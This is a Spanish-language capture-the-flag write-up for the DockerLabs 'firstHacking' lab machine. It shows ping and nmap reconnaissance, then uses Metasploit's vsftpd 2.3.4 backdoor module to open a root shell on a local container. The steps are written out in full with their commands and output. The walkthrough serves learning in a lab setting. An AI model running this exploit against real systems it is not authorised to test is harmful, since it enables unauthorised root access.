### Reconocimiento
#### Conectividad
Lo primero de todo es probar que hay conexión con un `ping`.
``` 
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/firstHacking]
└─$ ping -c2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.076 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.039 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1032ms
rtt min/avg/max/mdev = 0.039/0.057/0.076/0.018 ms
```
#### Escaneo de puertos
Ahora que sabemos que hay conectividad, vamos a escanear los servicios activos con `nmap`, para ello usaremos el comando:
``` 
nmap -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n 172.17.0.2 -oN scan.txt
```
Y obtendremos la siguiente salida:
``` 
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/firstHacking]
└─$ cat scan.txt 
# Nmap 7.98 scan initiated Fri Jan  2 16:08:11 2026 as: /usr/lib/nmap/nmap --privileged -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n -oN scan.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2026-01-02 16:08:11 CET for 2s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  2 16:08:13 2026 -- 1 IP address (1 host up) scanned in 1.94 seconds
```
### Explotación y escalada de privilegios
Vemos que el único puerto activo es el $21$ (servicio `ftp`), y esta versión es vulnerable, así que lo explotaremos con `metasploit`. Para ello lo primero es abrir la consola con el comando `msfconsole`.
Una vez abierta buscaremos el exploit para la vulnerabilidad, escribiendo lo siguiente:
``` 
msf > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```
Ahora escribiremos `use 0` para usar el exploit con el índice $0$ que corresponde al que queremos utilizar para explotar esta vulnerabilidad.
Luego escribimos lo siguiente para ver lo que necesitamos configurar para este exploit:
``` 
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:po
                                       rt[,type:host:port][...]. Supported
                                       proxies: sapni, socks4, socks5, sock
                                       s5h, http
   RHOSTS                    yes       The target host(s), see https://docs
                                       .metasploit.com/docs/using-metasploi
                                       t/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
Vemos que el único atributo obligatorio que no está ya puesto es `RHOSTS` así que lo fijamos escribiendo `set RHOSTS 172.17.0.2`. Ahora ya podremos poner `run` y el exploit comenzará.
``` 
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:37957 -> 172.17.0.2:6200) at 2026-01-02 16:12:35 +0100

whoami
root
```
Como podemos ver, esta vulnerabilidad nos ha permitido hacernos con el control total de la máquina directamente.
